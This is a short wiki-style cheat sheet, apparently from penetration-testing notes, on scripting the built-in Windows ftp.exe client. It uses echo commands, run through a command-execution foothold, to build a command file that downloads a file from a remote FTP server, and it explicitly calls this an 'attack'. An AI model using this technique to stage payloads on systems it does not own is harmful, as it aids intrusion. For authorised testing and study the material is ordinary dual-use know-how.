Windows FTP client

===== Installation =====
Windows ships with a default installation of ftp

===== Usage =====
{{{code: lang="sh" linenumbers="False"
ftp.exe [options]
}}}


==== Options ====
{{{code: lang="texinfo" linenumbers="False"
-s:filename					execute a list of commands in filename
-n							Suppresses auto login upon connection. This is required when performing example attack below						
}}}


===== Example =====

Create a file ftp.txt with the following contents
{{{code: lang="texinfo" linenumbers="True"
open <ip ftp server> <port>
USER <username on ftp server>
<password>
bin
GET <filename>
bye
}}}


Non interactively:
{{{code: lang="texinfo" linenumbers="True"
echo open <ip ftp server> <port> >> ftp.txt
echo USER <username on ftp server> >> ftp.txt
echo <password> >> ftp.txt
echo bin >> ftp.txt
echo GET <filename> >> ftp.txt
echo bye >> ftp.txt
}}}



Then excute:
{{{code: lang="sh" linenumbers="False"
ftp.exe -n -s:ftp.txt
}}}

This will download <filename> from the FTP server.


==== Remarks ====
* This may fail, as ftp.exe can only be used in active mode. Since in active mode the FTP server connects back to the client, the client's firewall may block the incoming connection.
* Test if the firewall is up, by checking for filtered port in NMAP's output.
* The contents of ftp.txt can be generated when command execution is present by executing line by line the command "echo <line> Â» ftp.txt"     Do NOT put quotes around the <line>
